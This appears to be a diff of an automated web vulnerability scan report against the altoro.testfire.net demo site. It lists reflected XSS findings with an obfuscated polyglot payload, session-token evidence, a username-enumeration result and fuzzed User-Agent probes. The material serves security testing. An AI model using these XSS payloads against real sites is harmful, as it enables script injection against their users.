@@ -64,16 +64,16 @@ There are three types of Cross-site Scripting attacks: non-persistent, persisten
 Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
 Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.
 
-* URL: http://altoro.testfire.net/login.jsp%3Fname=abc%23%3Cimg%20src=%22random.gif%22%20onerror=alert(5397&29%3E
+* URL: http://altoro.testfire.net%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
   * Method: `GET`
   * Parameter: ``
-  * Attack: `?name=abc#<img src="random.gif" onerror=alert(5397)>`
+  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
   * Evidence: ``
   * Other Info: `Tag name: input Att name:  Att id: `
-* URL: http://altoro.testfire.net%3Fname=abc%23%3Cimg%20src=%22random.gif%22%20onerror=alert(5397&29%3E
+* URL: http://altoro.testfire.net/login.jsp%23jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397&29%20&29//%250D%250A%250d%250a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert(5397&29//%3E%5Cx3e
   * Method: `GET`
   * Parameter: ``
-  * Attack: `?name=abc#<img src="random.gif" onerror=alert(5397)>`
+  * Attack: `#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e`
   * Evidence: ``
   * Other Info: `Tag name: input Att name:  Att id: `
 * URL: http://altoro.testfire.net/doLogin%3Fname=abc%23%3Cimg%20src=%22random.gif%22%20onerror=alert(5397&29%3E
@@ -402,7 +402,7 @@ The web server is configured to serve responses to ambiguous URLs in a manner th
 * URL: http://altoro.testfire.net/login.jsp
   * Method: `GET`
   * Parameter: ``
-  * Attack: `http://altoro.testfire.net/login.jsp/xdg64/akmhh`
+  * Attack: `http://altoro.testfire.net/login.jsp/haqlm/92ndo`
   * Evidence: `<a id="CatLink1" class="subheader" href="index.jsp?content=personal.htm">PERSONAL</a>`
   * Other Info: `No <base> tag was specified in the HTML <head> tag to define the location for relative URLs.
 A Content Type of "text/html;charset=ISO-8859-1" was specified. If the web browser is employing strict parsing rules, this will prevent cross-content attacks from succeeding. Quirks Mode in the web browser would disable strict parsing.  
@@ -902,7 +902,7 @@ It may be possible to enumerate usernames, based on differing HTTP responses whe
   * Parameter: `JSESSIONID`
   * Attack: `Manipulate [cookie] field: [JSESSIONID] and monitor the output `
   * Evidence: ``
-  * Other Info: `[cookie] parameter [JSESSIONID] leaks information on whether a user exists. The [2] differences in output, for the valid original username value [C8AEBBC43685A8A2B1006A8ED59B3F1E], and invalid username value [imkmvthakfvztmurijiajbrdaxesvonv] are:
+  * Other Info: `[cookie] parameter [JSESSIONID] leaks information on whether a user exists. The [2] differences in output, for the valid original username value [7F39AA36BD0F3D3004AE2EE72DE7795A], and invalid username value [fnfvzmtigoqcesgmudigpmosrtfpthoy] are:
 [
 (Changed Text)
 Output for Valid Username  : [position: 5, size: 1, lines: [content-length: 8360]]
@@ -1141,21 +1141,21 @@ The given response has been identified as containing a session management token.
   * Method: `GET`
   * Parameter: `JSESSIONID`
   * Attack: ``
-  * Evidence: `C8AEBBC43685A8A2B1006A8ED59B3F1E`
+  * Evidence: `7F39AA36BD0F3D3004AE2EE72DE7795A`
   * Other Info: `
 cookie:JSESSIONID`
 * URL: http://altoro.testfire.net/
   * Method: `GET`
   * Parameter: `JSESSIONID`
   * Attack: ``
-  * Evidence: `FC1787112ABBC190C3E85D8C247E91E2`
+  * Evidence: `55FE7A8D6211239C7916082757F618E2`
   * Other Info: `
 cookie:JSESSIONID`
-* URL: http://altoro.testfire.net
-  * Method: `GET`
+* URL: http://altoro.testfire.net/doLogin
+  * Method: `POST`
   * Parameter: `JSESSIONID`
   * Attack: ``
-  * Evidence: `C8AEBBC43685A8A2B1006A8ED59B3F1E`
+  * Evidence: `7F39AA36BD0F3D3004AE2EE72DE7795A`
   * Other Info: `
 cookie:JSESSIONID`
 
@@ -1241,13 +1241,13 @@ Check for differences in response based on fuzzed User Agent (eg. mobile sites, 
 * URL: http://altoro.testfire.net/login.jsp
   * Method: `GET`
   * Parameter: `Header User-Agent`
-  * Attack: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`
+  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
   * Evidence: ``
   * Other Info: ``
 * URL: http://altoro.testfire.net/login.jsp
   * Method: `GET`
   * Parameter: `Header User-Agent`
-  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
+  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0`
   * Evidence: ``
   * Other Info: ``
 * URL: http://altoro.testfire.net/login.jsp
